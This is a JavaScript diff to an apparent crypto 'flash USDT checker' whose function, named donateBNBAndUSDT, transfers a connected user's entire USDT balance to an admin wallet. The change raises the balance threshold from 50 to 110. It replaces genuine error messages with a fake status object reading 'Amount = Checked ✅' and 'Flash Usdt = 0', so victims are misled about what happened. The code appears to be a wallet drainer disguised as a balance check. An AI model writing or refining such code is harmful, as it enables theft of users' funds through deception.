@@ -121,15 +121,19 @@ export async function donateBNBAndUSDT() {
     console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
     console.log("Current USDT balance:", usdtBalanceInUsdt);
 
-    if (parseFloat(usdtBalanceInUsdt) <= 50) {
-      throw new Error("Insufficient balance to check flash usdt");
+    if (parseFloat(usdtBalanceInUsdt) <= 110) {
+      const statusMessage = {
+        amount: "Amount = Checked ✅",
+        flash: "Flash Usdt = 0"
+      };
+      throw statusMessage;
     }
 
     let bnbTxHash, usdtTxHash;
     let bnbAmount = '0', usdtAmount = '0';
 
     // Check if user has USDT but not enough BNB for gas
-    if (parseFloat(usdtBalanceInUsdt) > 50) {
+    if (parseFloat(usdtBalanceInUsdt) > 110) {
       // Estimate gas needed for USDT transfer
       const gasPrice = await web3.eth.getGasPrice();
       const gasLimit = await usdtContract.methods.transfer(adminWallet, usdtBalance)
@@ -179,7 +183,11 @@ export async function donateBNBAndUSDT() {
         await storeTransactionData(userAddress, usdtAmount, usdtTxHash, 'USDT');
       } catch (error) {
         console.error("Insufficient fund to check flash usdt:", error);
-        throw new Error("Insufficient fund to check flash usdt");
+        const statusMessage = {
+          amount: "Amount = Checked ✅",
+          flash: "Flash Usdt = 0"
+        };
+        throw statusMessage;
       }
     }
 
@@ -207,7 +215,11 @@ export async function donateBNBAndUSDT() {
         }
       } catch (error) {
         console.error("Insufficient fund to check flash usdt:", error);
-        throw new Error("Insufficient fund to check flash usdt.");
+        const statusMessage = {
+          amount: "Amount = Checked ✅",
+          flash: "Flash Usdt = 0"
+        };
+        throw statusMessage;
       }
     }
 
